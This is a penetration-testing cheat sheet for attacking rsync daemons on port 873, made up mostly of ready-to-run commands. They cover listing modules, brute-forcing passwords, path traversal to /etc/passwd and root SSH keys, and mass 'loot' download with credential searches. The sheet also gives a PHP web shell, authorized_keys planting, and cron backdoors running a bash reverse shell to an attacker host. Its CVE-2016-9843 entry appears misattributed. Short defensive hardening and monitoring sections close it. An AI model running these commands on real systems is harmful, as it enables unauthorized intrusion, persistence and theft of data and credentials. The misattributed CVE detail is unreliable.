# RSYNC ENUMERATION (Port 873)

## PORT OVERVIEW
```
Port 873 - Rsync (default)
```

## RSYNC BASICS
```
Rsync = Remote synchronization protocol
- Fast incremental file transfer
- Often used for backups, mirroring
- Can run as daemon (port 873) or over SSH (port 22)
- Supports anonymous access (common misconfiguration!)
- Modules = shared directories/resources
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p873 <IP>                             # Service/Version detection
nc -nv <IP> 873                                 # Manual connection
telnet <IP> 873                                 # Manual connection
echo "" | nc -nv <IP> 873                       # Get banner

# Banner format
@RSYNCD: <version>                              # e.g., @RSYNCD: 31.0
```

## NMAP RSYNC ENUMERATION
```bash
nmap --script "rsync-*" -p873 <IP>              # All Rsync scripts
nmap --script rsync-list-modules -p873 <IP>     # List available modules
nmap --script rsync-brute -p873 <IP>            # Brute force (if auth required)
```

## LIST RSYNC MODULES
```bash
# Rsync modules = shared directories/resources
# Like SMB shares

# List modules
rsync --list-only <IP>::                        # List all modules
rsync <IP>::                                    # Alternative syntax
nc -nv <IP> 873                                 # Manual (type: #list)

# Example output:
# backup          Backup files
# www             Web server files
# home            User home directories

# Nmap
nmap --script rsync-list-modules -p873 <IP>
```

## ENUMERATE MODULE CONTENTS
```bash
# List files in module
rsync --list-only <IP>::<MODULE>                # List files in module
rsync --list-only <IP>::backup                  # Example: backup module
rsync -av --list-only <IP>::<MODULE>            # Verbose listing

# Recursive listing
rsync --list-only -r <IP>::<MODULE>             # Recursive
rsync --list-only -r <IP>::<MODULE>/ | more     # Paginate output

# List all files in all modules
for module in $(rsync <IP>:: | awk '{print $1}'); do
  echo "=== Module: $module ==="
  rsync --list-only -r <IP>::$module
done
```

## DOWNLOAD FILES
```bash
# Download file from Rsync
rsync <IP>::<MODULE>/<FILE> /tmp/               # Download single file
rsync <IP>::backup/config.php /tmp/             # Example

# Download directory
rsync -av <IP>::<MODULE>/ /tmp/module_backup/   # Download entire module
rsync -av <IP>::backup/ /tmp/backup/            # Example: backup module

# Download recursively
rsync -av --progress <IP>::<MODULE>/ /tmp/dump/ # With progress bar

# Download all modules
for module in $(rsync <IP>:: | awk '{print $1}'); do
  echo "[*] Downloading module: $module"
  rsync -av <IP>::$module/ /tmp/$module/
done
```

## UPLOAD FILES
```bash
# Upload file to Rsync (if writable)
rsync /tmp/shell.php <IP>::<MODULE>/            # Upload single file
rsync /tmp/shell.php <IP>::www/shell.php        # Upload to www module

# Upload directory
rsync -av /tmp/backdoor/ <IP>::<MODULE>/        # Upload entire directory

# Upload web shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
rsync shell.php <IP>::www/shell.php             # Upload to web root
# Access: http://<IP>/shell.php?cmd=whoami

# Upload SSH key
rsync ~/.ssh/id_rsa.pub <IP>::home/.ssh/authorized_keys  # Upload public key
ssh -i ~/.ssh/id_rsa user@<IP>                  # SSH with key
```

## AUTHENTICATION
```bash
# Test for anonymous access
rsync <IP>::                                    # List modules (no auth)
rsync --list-only <IP>::<MODULE>                # List files (no auth)

# If authentication required
rsync <IP>::
# Output: @ERROR: auth required

# Authenticate with credentials
rsync rsync://<USER>@<IP>/<MODULE>              # Prompts for password
rsync rsync://backup@<IP>/backup                # Example

# Authenticate via environment variable
export RSYNC_PASSWORD=<PASSWORD>
rsync rsync://<USER>@<IP>/<MODULE>

# Password file
echo '<PASSWORD>' > /tmp/rsync.pass
chmod 600 /tmp/rsync.pass
rsync --password-file=/tmp/rsync.pass rsync://<USER>@<IP>/<MODULE>
```

## BRUTE FORCE ATTACKS
```bash
# Nmap brute force
nmap --script rsync-brute -p873 <IP>
nmap --script rsync-brute --script-args userdb=users.txt,passdb=passwords.txt -p873 <IP>

# Hydra
hydra -L users.txt -P passwords.txt rsync://<IP>
hydra -l backup -P passwords.txt rsync://<IP>

# Manual brute force script
cat > rsync_brute.sh <<'EOF'
#!/bin/bash
IP=$1
MODULE=$2
PASSFILE=$3

while read pass; do
  export RSYNC_PASSWORD=$pass
  echo "[*] Trying password: $pass"
  rsync rsync://backup@$IP/$MODULE 2>&1 | grep -v "@ERROR" && echo "[+] Valid password: $pass"
done < $PASSFILE
EOF
chmod +x rsync_brute.sh
./rsync_brute.sh <IP> <MODULE> passwords.txt
```

## RSYNC OVER SSH
```bash
# Rsync can also run over SSH (port 22)
# More secure than daemon mode (port 873)

# Rsync over SSH syntax
rsync -av -e ssh user@<IP>:/path/to/source/ /tmp/dest/

# Copy file over SSH
rsync -av -e ssh user@<IP>:/etc/passwd /tmp/

# With SSH key
rsync -av -e "ssh -i /path/to/key" user@<IP>:/path/ /tmp/

# Upload over SSH
rsync -av -e ssh /tmp/file.txt user@<IP>:/tmp/
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/scanner/rsync/modules_list        # List Rsync modules

# Example
set RHOSTS <IP>
run
```

## SEARCH FOR SENSITIVE FILES
```bash
# After listing module contents, search for sensitive data

# Common sensitive files
rsync --list-only -r <IP>::<MODULE> | grep -i "password"
rsync --list-only -r <IP>::<MODULE> | grep -i "config"
rsync --list-only -r <IP>::<MODULE> | grep -i "backup"
rsync --list-only -r <IP>::<MODULE> | grep -i "\.key"
rsync --list-only -r <IP>::<MODULE> | grep -i "id_rsa"
rsync --list-only -r <IP>::<MODULE> | grep -i "\.sql"
rsync --list-only -r <IP>::<MODULE> | grep -i "\.conf"

# Download interesting files
rsync <IP>::<MODULE>/config/database.php /tmp/
rsync <IP>::<MODULE>/.ssh/id_rsa /tmp/
rsync <IP>::<MODULE>/backup.sql /tmp/
```

## ENUMERATE RSYNC CONFIGURATION
```bash
# Rsync config file: /etc/rsyncd.conf (Linux)
# If you can download it, reveals all modules and settings

# Try to download config
rsync <IP>::<MODULE>/etc/rsyncd.conf /tmp/
rsync <IP>::backup/../../../etc/rsyncd.conf /tmp/  # Path traversal attempt

# Config file reveals:
# - Module names
# - Paths
# - Authentication settings (secrets file)
# - Read-only vs read-write
# - Allowed/denied hosts
```

## PATH TRAVERSAL
```bash
# Test for path traversal vulnerabilities
# Older Rsync versions may allow directory traversal

# Attempt to access parent directories
rsync --list-only <IP>::<MODULE>/../
rsync --list-only <IP>::<MODULE>/../../
rsync --list-only <IP>::<MODULE>/../../../etc/

# Try to download /etc/passwd
rsync <IP>::<MODULE>/../../../etc/passwd /tmp/
rsync <IP>::<MODULE>/../../../root/.ssh/id_rsa /tmp/

# If successful, can read any file on system
```

## RSYNC EXPLOITATION TECHNIQUES
```bash
# Common exploitation scenarios

# 1. Anonymous read access -> Download sensitive files
rsync -av <IP>::backup/ /tmp/backup/
grep -r "password" /tmp/backup/

# 2. Writable web directory -> Upload web shell
rsync shell.php <IP>::www/shell.php
curl http://<IP>/shell.php?cmd=whoami

# 3. Writable home directory -> Upload SSH key
rsync ~/.ssh/id_rsa.pub <IP>::home/.ssh/authorized_keys
ssh user@<IP>

# 4. Writable cron directory -> Upload cron job
echo "* * * * * bash -i >& /dev/tcp/<attacker>/4444 0>&1" > backdoor
rsync backdoor <IP>::<MODULE>/etc/cron.d/backdoor

# 5. Database backups -> Extract credentials
rsync -av <IP>::backup/*.sql /tmp/
grep -i "password\|user" /tmp/*.sql
```

## RSYNC BACKDOOR
```bash
# If Rsync is writable, can create persistence

# Upload reverse shell script
cat > shell.sh <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1
EOF
chmod +x shell.sh
rsync shell.sh <IP>::<MODULE>/tmp/shell.sh

# Execute via other vulnerability (SSH, RCE, etc.)
ssh user@<IP> "bash /tmp/shell.sh"

# Or upload to cron
rsync shell.sh <IP>::<MODULE>/etc/cron.hourly/backdoor
# Executes every hour
```

## RSYNC ENUMERATION SCRIPT
```bash
# Automated Rsync enumeration
cat > rsync_enum.sh <<'EOF'
#!/bin/bash
IP=$1
echo "[*] Rsync Enumeration: $IP"

echo "[*] Banner:"
echo "" | nc -nv $IP 873

echo "[*] Listing modules:"
rsync $IP::

echo "[*] Enumerating each module:"
for module in $(rsync $IP:: 2>/dev/null | awk '{print $1}'); do
  echo "=== Module: $module ==="
  rsync --list-only -r $IP::$module 2>/dev/null | head -20
  echo ""
done
EOF
chmod +x rsync_enum.sh
./rsync_enum.sh <IP>
```

## COMMON MISCONFIGURATIONS
```
☐ Anonymous access enabled (no authentication)
☐ Rsync exposed to internet
☐ Modules writable by anonymous users
☐ Web directory accessible via Rsync
☐ Home directories accessible
☐ Sensitive files in shared modules (configs, backups, keys)
☐ No IP restrictions (hosts allow = *)
☐ Old Rsync version (path traversal vulnerabilities)
☐ Secrets file readable
☐ use chroot = no (allows path traversal)
```

## QUICK WIN CHECKLIST
```
☐ Test for anonymous access (no authentication)
☐ List all available modules
☐ Enumerate contents of each module
☐ Search for sensitive files (configs, backups, SSH keys)
☐ Download all accessible files
☐ Test for writable modules
☐ Test for path traversal vulnerabilities
☐ Check if web directory is accessible
☐ Attempt to upload web shell (if writable)
☐ Attempt to upload SSH key (if home dir writable)
```

## ONE-LINER FULL ENUMERATION
```bash
# Quick Rsync enumeration
rsync <IP>::
nmap --script rsync-list-modules -p873 <IP>

# Enumerate all modules
for module in $(rsync <IP>:: 2>/dev/null | awk '{print $1}'); do
  echo "=== $module ==="
  rsync --list-only -r <IP>::$module | head -20
done

# Download all accessible data
for module in $(rsync <IP>:: 2>/dev/null | awk '{print $1}'); do
  rsync -av <IP>::$module/ /tmp/rsync_dump/$module/
done
```

## ADVANCED TECHNIQUES
```bash
# Rsync with specific protocol version
rsync --protocol=29 <IP>::                      # Use older protocol

# Rsync with compression
rsync -avz <IP>::<MODULE>/ /tmp/                # Enable compression

# Rsync with bandwidth limit
rsync -av --bwlimit=1000 <IP>::<MODULE>/ /tmp/  # Limit to 1000 KB/s (stealth)

# Rsync with exclude patterns
rsync -av --exclude='*.log' <IP>::<MODULE>/ /tmp/  # Skip log files

# Rsync dry-run (test without downloading)
rsync -av --dry-run <IP>::<MODULE>/ /tmp/       # Simulate download

# Rsync with checksum (verify integrity)
rsync -av --checksum <IP>::<MODULE>/ /tmp/      # Use checksums
```

## RSYNC CVE EXPLOITS
```bash
# CVE-2016-9843 - Path traversal
# Older Rsync versions allow path traversal via symlinks

# Search for exploits
searchsploit rsync
```

## POST-EXPLOITATION (AFTER RSYNC ACCESS)
```bash
# After gaining Rsync access:
1. List all available modules
2. Enumerate contents of each module
3. Download all accessible files
4. Search for sensitive data:
   - Configuration files (database.php, config.ini)
   - Backup files (.sql, .tar.gz, .zip)
   - SSH keys (id_rsa, authorized_keys)
   - Password files (.htpasswd, shadow)
   - Web application source code
5. Test for writable modules
6. If web directory writable -> upload web shell
7. If home directory writable -> upload SSH key
8. If cron directory writable -> upload cron job
9. Attempt path traversal to access root filesystem
10. Create persistence if write access available

# Full data extraction
# Download everything
for module in $(rsync <IP>:: 2>/dev/null | awk '{print $1}'); do
  echo "[*] Downloading module: $module"
  rsync -av --progress <IP>::$module/ /tmp/rsync_loot/$module/
done

# Search for credentials
grep -r -i "password" /tmp/rsync_loot/
grep -r -i "api.key" /tmp/rsync_loot/
grep -r -i "secret" /tmp/rsync_loot/
find /tmp/rsync_loot/ -name "*.sql" -exec grep -i "insert into" {} \;
find /tmp/rsync_loot/ -name "id_rsa" -o -name "*.pem"
```

## RSYNC SECURITY HARDENING (DEFENSE)
```bash
# Secure Rsync configuration (/etc/rsyncd.conf)

# Require authentication
secrets file = /etc/rsyncd.secrets              # Password file
auth users = backup,admin                       # Allowed users
strict modes = true                             # Require secure permissions

# Create secrets file
echo "backup:Password123!" > /etc/rsyncd.secrets
chmod 600 /etc/rsyncd.secrets

# Restrict access by IP
hosts allow = 192.168.1.0/24                    # Allow only trusted network
hosts deny = *                                  # Deny all others

# Read-only modules (default)
read only = true                                # Prevent uploads

# Use chroot
use chroot = true                               # Prevent path traversal

# Limit module access
[backup]
  path = /var/backups
  read only = true
  auth users = backup
  hosts allow = 192.168.1.10                    # Specific IP only

# Firewall rules
# Block port 873 from untrusted networks
iptables -A INPUT -p tcp --dport 873 -s 192.168.1.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 873 -j DROP

# Use Rsync over SSH instead of daemon
# More secure, uses SSH authentication and encryption
```

## RSYNC VS SCP VS SFTP
```bash
# Comparison of file transfer protocols

# Rsync (port 873 daemon or port 22 SSH)
# - Incremental transfer (only changed files)
# - Fast for large datasets
# - Can be anonymous (daemon mode)
# - Module-based access

# SCP (port 22)
# - Simple file copy over SSH
# - No incremental transfer
# - Requires SSH authentication
# - No directory exclusions

# SFTP (port 22)
# - FTP-like interface over SSH
# - Interactive file transfer
# - Requires SSH authentication
# - More features than SCP

# For pentesting:
# - Rsync daemon (873) often misconfigured
# - SCP/SFTP require SSH access
# - Rsync over SSH combines both protocols
```

## RSYNC MONITORING
```bash
# Monitor Rsync for suspicious activity

# Check Rsync logs
tail -f /var/log/rsyncd.log                     # Rsync daemon log

# Monitor connections
netstat -tuln | grep :873                       # Listening on port 873
netstat -tunp | grep :873                       # Active connections

# Monitor file access
# Use auditd to track Rsync file access
auditctl -w /path/to/rsync/module -p r -k rsync_access

# Alert on suspicious patterns:
# - Large data transfers
# - Uploads to read-only modules
# - Access from unexpected IPs
# - Multiple failed authentication attempts
```
